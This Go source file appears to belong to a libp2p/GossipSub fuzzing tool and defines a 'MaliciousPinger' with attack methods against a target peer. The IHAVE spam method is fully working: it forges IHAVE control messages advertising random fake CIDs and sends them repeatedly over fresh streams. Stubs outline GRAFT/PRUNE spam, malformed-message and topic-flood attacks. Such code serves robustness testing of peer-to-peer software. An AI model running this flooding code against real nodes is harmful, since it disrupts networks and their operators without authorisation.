package p2pfuzz

import (
	"fmt"
	"log"
	"math/rand"
	"time"

	"github.com/ipfs/go-cid"
	pubsub "github.com/libp2p/go-libp2p-pubsub"
	pb "github.com/libp2p/go-libp2p-pubsub/pb"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/multiformats/go-multihash"
	// "github.com/libp2p/go-libp2p/core/peer" // Might need later
)

// NOTE: These functions assume 'ps' is a valid pubsub instance created on 'h'
// and that 'h' is already connected to the target peer.

// sendPubSubIHaveSpam sends multiple IHAVE control messages with fake CIDs directly to the target.
func (mp *MaliciousPinger) sendPubSubIHaveSpam(h host.Host, ps *pubsub.PubSub) error {
	log.Printf("Starting PubSub IHAVE spam attack against %s", mp.targetInfo.ID)

	// Define a topic and the number of messages/CIDs to advertise
	topicName := "/fil/blocks/fuzz"
	numCIDs := 20 + rand.Intn(30)        // 20-50 CIDs
	numSpamMessages := 5 + rand.Intn(15) // Send 5-20 IHAVE messages

	// Generate fake CIDs as both bytes and strings
	msgIDsStrings := make([]string, 0, numCIDs) // Slice for string representation
	for i := 0; i < numCIDs; i++ {
		b := make([]byte, 32)
		rand.Read(b)
		mh, _ := multihash.Encode(b, multihash.SHA2_256)
		c := cid.NewCidV1(cid.Raw, mh)
		msgIDsStrings = append(msgIDsStrings, c.String()) // Store string representation
	}

	// Construct the core IHAVE control message
	controlMsg := &pb.ControlMessage{
		Ihave: []*pb.ControlIHave{
			{
				TopicID:    &topicName,
				MessageIDs: msgIDsStrings, // Use the string slice to satisfy the linter
			},
		},
	}
	rpc := &pb.RPC{Control: controlMsg}
	data, err := rpc.Marshal()
	if err != nil {
		return fmt.Errorf("failed to marshal IHAVE RPC: %w", err)
	}

	// Send the message multiple times directly via streams
	gossipSubProto := pubsub.GossipSubID_v11 // Use the appropriate GossipSub protocol ID
	log.Printf("Sending %d IHAVE messages (each with %d CIDs) for topic '%s' using proto %s",
		numSpamMessages, numCIDs, topicName, gossipSubProto)

	var successCount int
	for i := 0; i < numSpamMessages; i++ {
		stream, err := h.NewStream(mp.ctx, mp.targetInfo.ID, gossipSubProto)
		if err != nil {
			log.Printf("IHAVE Spam: Failed to open stream %d/%d: %v", i+1, numSpamMessages, err)
			// Don't stop entirely, try the next one
			continue
		}

		_, err = stream.Write(data)
		if err != nil {
			log.Printf("IHAVE Spam: Failed to write to stream %d/%d: %v", i+1, numSpamMessages, err)
			stream.Reset()
			continue
		}

		// Close the stream quickly after writing
		err = stream.Close()
		if err != nil {
			log.Printf("IHAVE Spam: Failed to close stream %d/%d: %v", i+1, numSpamMessages, err)
		}
		successCount++

		// Brief pause between messages
		time.Sleep(time.Duration(10+rand.Intn(40)) * time.Millisecond)
	}

	log.Printf("PubSub IHAVE spam attack finished. Sent %d/%d messages successfully.", successCount, numSpamMessages)
	return nil
}

func (mp *MaliciousPinger) sendPubSubGraftPruneSpam(h host.Host, ps *pubsub.PubSub) error {
	log.Printf("Starting PubSub GRAFT/PRUNE spam attack")
	// TODO: Implementation - join a topic, repeatedly send GRAFT/PRUNE messages
	return fmt.Errorf("sendPubSubGraftPruneSpam not yet implemented")
}

func (mp *MaliciousPinger) sendPubSubMalformedMsg(h host.Host, ps *pubsub.PubSub) error {
	log.Printf("Starting PubSub malformed message attack")
	// TODO: Implementation - craft invalid RPC messages, find a way to send them to the target
	// This might be tricky as the pubsub library handles encoding.
	// Might need lower-level access or crafting raw stream messages.
	return fmt.Errorf("sendPubSubMalformedMsg not yet implemented")
}

func (mp *MaliciousPinger) sendPubSubTopicFlood(h host.Host, ps *pubsub.PubSub) error {
	log.Printf("Starting PubSub topic flood attack")
	// TODO: Implementation - generate many topic names, rapidly join/leave them
	return fmt.Errorf("sendPubSubTopicFlood not yet implemented")
}
